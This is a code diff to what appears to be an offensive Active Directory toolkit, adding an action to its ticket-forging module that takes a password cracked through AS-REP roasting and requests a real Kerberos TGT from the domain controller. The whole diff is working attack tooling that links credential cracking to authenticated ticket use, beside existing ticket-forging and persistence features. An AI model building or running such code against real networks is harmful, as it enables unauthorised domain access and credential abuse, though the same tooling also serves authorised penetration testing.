@@ -45,6 +45,13 @@ pub enum ForgeAction {
         /// Output format: kirbi, ccache, base64
         output_format: String,
     },
+    /// Convert a cracked AS-REP roast password into a usable TGT.
+    /// Takes the plaintext password from AS-REP roasting and requests
+    /// a real TGT from the KDC.
+    AsRepToTgt {
+        /// Cracked plaintext password from AS-REP roast
+        cracked_password: String,
+    },
 }
 
 impl std::fmt::Display for ForgeAction {
@@ -72,6 +79,7 @@ impl std::fmt::Display for ForgeAction {
             } => {
                 write!(f, "Convert Ticket ({} → {})", input_path, output_format)
             }
+            Self::AsRepToTgt { .. } => write!(f, "AS-REP → TGT"),
         }
     }
 }
@@ -351,6 +359,58 @@ pub async fn run_forge(config: &ForgeConfig) -> Result<ForgeResult> {
                     output_path,
                     output_bytes.len()
                 ),
+            }
+        }
+        ForgeAction::AsRepToTgt { cracked_password } => {
+            // Use the cracked AS-REP password to request a real TGT from the KDC.
+            // This bridges the gap between hunter (AS-REP roast) and forge (ticket use).
+            use overthrone_core::proto::kerberos;
+
+            let tgt_result = kerberos::request_tgt(
+                &config.dc_ip,
+                &config.domain,
+                &config.username,
+                cracked_password,
+                false, // use password, not hash
+            )
+            .await;
+
+            match tgt_result {
+                Ok(tgt) => ForgeResult {
+                    action: "AS-REP → TGT".to_string(),
+                    domain: config.domain.clone(),
+                    success: true,
+                    ticket_data: Some(ForgedTicket {
+                        ticket_type: "TGT".to_string(),
+                        impersonated_user: config.username.clone(),
+                        domain: config.domain.clone(),
+                        spn: format!("krbtgt/{}", config.domain),
+                        encryption_type: "RC4-HMAC".to_string(),
+                        valid_from: String::new(),
+                        valid_until: String::new(),
+                        group_rids: vec![],
+                        extra_sids: vec![],
+                        kirbi_path: None,
+                        ccache_path: None,
+                        kirbi_base64: None,
+                        ticket_size_bytes: tgt.ticket.enc_part.cipher.len(),
+                    }),
+                    persistence_result: None,
+                    message: format!(
+                        "AS-REP password converted to TGT for {}@{} (ticket acquired, {} bytes encrypted)",
+                        config.username,
+                        config.domain,
+                        tgt.ticket.enc_part.cipher.len()
+                    ),
+                },
+                Err(e) => ForgeResult {
+                    action: "AS-REP → TGT".to_string(),
+                    domain: config.domain.clone(),
+                    success: false,
+                    ticket_data: None,
+                    persistence_result: None,
+                    message: format!("Failed to request TGT with AS-REP password: {}", e),
+                },
             }
         }
     };
